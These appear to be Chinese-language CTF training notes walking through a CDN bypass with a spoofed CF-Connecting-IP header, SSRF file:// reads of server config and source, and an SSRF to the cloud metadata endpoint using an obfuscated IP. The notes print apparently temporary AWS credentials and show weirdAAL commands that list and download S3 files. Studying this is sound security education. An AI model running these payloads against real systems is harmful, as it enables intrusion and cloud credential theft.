# 8/2 morning WEB security

## CDN繞過

題目 [https://realme.0x61697333.cf](https://realme.0x61697333.cf)

要繞過CDN 先用[virustotal](https://www.virustotal.com/zh-tw/)掃一下domain

結果:
```
2018-08-01 104.28.10.231
2018-08-01 104.28.11.231
2018-07-31 52.194.38.175
```
前兩個是CDN

52.194.38.175 是server位置

在/etc/hosts新增

`52.194.38.175  realme.0x61697333.cf`

(讓請求不要走CDN)

> curl -H "CF-Connecting-IP: 127.0.0.1" http://realme.0x61697333.cf/

## SSRF

## 01
[SSRF 01](http://ssrf01.0x61697333.cf/index.php)

提示是ubuntu, nginx 

先看設定檔預設路徑

丟輸入匡

> file:///etc/nginx/sites-enabled/default

> file:///meow/ais3/index.php

## 10
[SSRF 11](http://ssrf01.0x61697333.cf/index.php)

ip有基本檢查 要繞一下

在輸入匡丟:
> http://169.254.169.0xfe/latest/meta-data/iam/security-credentials

噴:`MagicAIS3`

輸入匡:
> http://169.254.169.0xfe/latest/meta-data/iam/security-credentials/MagicAIS3

把資料加到[weirdAAL](https://github.com/carnal0wnage/weirdAAL)設定檔

```
[default]
aws_access_key_id = ASIAU2Z4MLXCGNVN256B
aws_secret_access_key = dGtFxTt/kdPdS0k6UMoaxMO9VMjw0Pk4CQLxnM/M
aws_session_token = FQoGZXIvYXdzEC4aDFOpSAIZQ01cgHHwrCLBAx8DBVXgbglo6WvkIToFh71yqrXXN56Hh7dyMIzGzfbyZ0c3NO6f/RVWVlUXM3zSIEdLuP    PEVgfuy0KL85cHV1hfP62v5kFW4SIhwaGyJjhEh5nJsV8AUlpgUfeZljPexUA5F0viz1p0lg7bPTR9CQZYSZsNP3PLkudYXTGG/Lf4u40o2oElwQsbG1R6Zf2A7nxb    3xj63u2g4fhJV+pqBkhLLSOOrEiQ2Y7B+7yKSWtf0fSWZtwZgbqsG8ClzflMWejzu5RbcDXHsoHiILgE9tZoWqRU6zKxKOrczk03LAbIuVDfpj8oCjIDq0uU9/BFMh    qTUKXjzNslGeiYgsqVyhwvKexfLYpjHWaGs8wuYFrI/R2NKn08oN6qIph/bj2jeEISdxjih1oHmDDLMOlUEhHewLVdqDM9zpJ9pjjMZWOepsOoAbwpDCu8mMfHvS7N    q2zhsmQ1dueVxP48Ps1sQKhDa83sx9esMxfrYvYnXY34h1csxU4kCdgoGcqR/soKTOHXnvcj9i5ZZ0Gw+JUtL7yezt0l6UVhdZtu5UBbhn848LrkhFlXo4sqyHdxF4    y+kkka26WsmHBqOny0sc29SJAhKK2KitsF
```

terminal:

> python3 weirdAAL.py -m s3_list_buckets -t yoo

> python3 weirdAAL.py -m s3_list_bucket_contents -a "ais3-flag-box" -t yolo

> python3 weirdAAL.py -m s3_download_file -a 'ais3-flag-box','ais3-flag.txt' -t yolo
